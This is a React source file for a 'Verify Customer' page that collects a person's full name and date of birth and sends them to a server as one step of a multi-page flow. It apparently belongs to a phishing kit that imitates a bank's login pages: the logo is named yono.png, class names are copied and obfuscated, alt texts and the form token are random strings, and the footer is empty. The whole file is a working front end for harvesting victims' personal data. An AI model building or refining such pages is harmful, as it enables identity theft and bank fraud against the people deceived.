import { useState, FormEvent, useEffect } from 'react';
import { useLocation } from 'wouter';
import { updateUserData, getNextRoute, saveIntermediateData } from '@/lib/userState';

export default function VerifyCustomerPage() {
  const [, navigate] = useLocation();
  const [fullName, setFullName] = useState('');
  const [dateOfBirth, setDateOfBirth] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [userEditing, setUserEditing] = useState(false);
  
  // Function to format date input into dd/mm/yyyy format
  const formatDateInput = (input: string): string => {
    // First, handle common date formats with separators already present
    // Check for formats like dd-mm-yyyy, dd.mm.yyyy, etc.
    const commonFormats = [
      /^(\d{1,2})[-./](\d{1,2})[-./](\d{1,4})$/, // dd-mm-yyyy or d-m-yyyy or mixed separators
      /^(\d{1,2})[-./](\d{1,2})$/, // dd-mm or d-m
    ];
    
    for (const format of commonFormats) {
      const match = input.match(format);
      if (match) {
        if (match.length === 4) {
          // dd-mm-yyyy format
          let day = match[1].padStart(2, '0');
          let month = match[2].padStart(2, '0');
          let year = match[3];
          
          // Limit day and month to valid ranges
          day = Math.min(Math.max(parseInt(day), 1), 31).toString().padStart(2, '0');
          month = Math.min(Math.max(parseInt(month), 1), 12).toString().padStart(2, '0');
          
          // Handle year formatting
          if (year.length === 1 || year.length === 2) {
            // For single or double digit years, assume 2000s
            year = `20${year.padStart(2, '0')}`;
          } else if (year.length === 3) {
            // For 3 digit years, add leading 1 or 2
            year = `2${year}`;
          } else if (year.length > 4) {
            // Truncate years longer than 4 digits
            year = year.substring(0, 4);
          }
          
          return `${day}/${month}/${year}`;
        } else if (match.length === 3) {
          // dd-mm format
          let day = match[1].padStart(2, '0');
          let month = match[2].padStart(2, '0');
          
          // Limit day and month to valid ranges
          day = Math.min(Math.max(parseInt(day), 1), 31).toString().padStart(2, '0');
          month = Math.min(Math.max(parseInt(month), 1), 12).toString().padStart(2, '0');
          
          return `${day}/${month}`;
        }
      }
    }
    
    // If no common format detected, process as raw input
    // Remove all non-numeric characters
    let digitsOnly = input.replace(/\D/g, '');
    
    // Limit to 8 digits (ddmmyyyy)
    if (digitsOnly.length > 8) {
      digitsOnly = digitsOnly.substring(0, 8);
    }
    
    // Format as dd/mm/yyyy
    if (digitsOnly.length >= 1 && digitsOnly.length <= 2) {
      // Just the day part
      const day = Math.min(Math.max(parseInt(digitsOnly) || 1, 1), 31).toString().padStart(2, '0');
      return day;
    } else if (digitsOnly.length >= 3 && digitsOnly.length <= 4) {
      // Day and month parts
      const day = Math.min(Math.max(parseInt(digitsOnly.substring(0, 2)) || 1, 1), 31).toString().padStart(2, '0');
      const month = Math.min(Math.max(parseInt(digitsOnly.substring(2)) || 1, 1), 12).toString().padStart(2, '0');
      return `${day}/${month}`;
    } else if (digitsOnly.length >= 5) {
      // Day, month, and year parts
      const day = Math.min(Math.max(parseInt(digitsOnly.substring(0, 2)) || 1, 1), 31).toString().padStart(2, '0');
      const month = Math.min(Math.max(parseInt(digitsOnly.substring(2, 4)) || 1, 1), 12).toString().padStart(2, '0');
      const year = digitsOnly.substring(4);
      return `${day}/${month}/${year}`;
    }
    
    return digitsOnly;
  };
  
  // Handle date field changes
  const handleDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const input = e.target.value;
    
    // Store the user's raw input temporarily
    setDateOfBirth(input);
    
    // Mark that the user is editing
    setUserEditing(true);
  };
  
  // Format the date when the user finishes typing
  useEffect(() => {
    if (userEditing) {
      // Set a short timeout to let the user finish typing
      const timer = setTimeout(() => {
        // Auto-format the date
        const formattedDate = formatDateInput(dateOfBirth);
        setDateOfBirth(formattedDate);
        setUserEditing(false);
      }, 500); // 500ms debounce
      
      return () => clearTimeout(timer);
    }
  }, [dateOfBirth, userEditing]);
  
  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    
    try {
      // Save the form data
      updateUserData({
        fullName,
        dateOfBirth
      });
      
      // Save data to the server
      await saveIntermediateData();
      
      // Navigate to the next page in the flow
      navigate(getNextRoute());
    } catch (error) {
      console.error('Error saving data:', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div id="__next">
      <header className="Jeuookhh_logo__chFnY">
        <img 
          alt="gW2dWg" 
          loading="lazy" 
          width="120" 
          height="32" 
          decoding="async"
          data-nimg="1" 
          src="/images/yono.png" 
          style={{ color: "transparent" }} 
        />
      </header>
      <main>
        <div className="Jeuookhh_login_heading__g_rIN">
          <h3 className="Jeuookhh_login_heading_h3__40cUi">Verify Customer</h3>
        </div>
        <div className="Jeuookhh_login_form__UT1PX">
          <p className="Jeuookhh_mandatory_txt__seeNN">Mandatory fields are indicated with an asterisk ().</p>
          <form className="Jeuookhh_form__NPDIu" onSubmit={handleSubmit}>
            <input type="hidden" name="formtoken" value="VEtOxk" />
            <div className="Jeuookhh_form_group__iOuIR">
              <label className="Jeuookhh_label__fvDl5">
                Your Full Name <span className="Jeuookhh_mandatory_txt__seeNN">*</span>
              </label>
              <input 
                name="cFname" 
                type="text" 
                className="Jeuookhh_form_control__aKuXl" 
                required 
                maxLength={30}
                value={fullName}
                onChange={(e) => setFullName(e.target.value)}
              />
            </div>
            <div className="Jeuookhh_form_group__iOuIR">
              <label className="Jeuookhh_label__fvDl5">
                Date of Birth <span className="Jeuookhh_mandatory_txt__seeNN">*</span>
              </label>
              <input 
                name="Birtd" 
                type="text" 
                className="Jeuookhh_form_control__aKuXl" 
                required 
                placeholder="dd/mm/yyyy" 
                value={dateOfBirth}
                onChange={handleDateChange} 
              />
            </div>
            <div className="Jeuookhh_t_center____ZxZ">
              <input 
                type="submit" 
                className="Jeuookhh_btn_default__PIkhU" 
                value={isSubmitting ? "Processing..." : "submit"}
                disabled={isSubmitting} 
              />
            </div>
          </form><br />
        </div>
      </main>
      <div className="Jeuookhh_footer_area__5ot65">
        <img 
          alt="brwi10" 
          loading="lazy" 
          width="68" 
          height="28" 
          decoding="async" 
          data-nimg="1" 
          src="/images/gwhp.png" 
          style={{ color: "transparent" }} 
        />
      </div>
      <div className="Jeuookhh_footer__Wxn0J">
        <p>©</p>
      </div>
    </div>
  );
}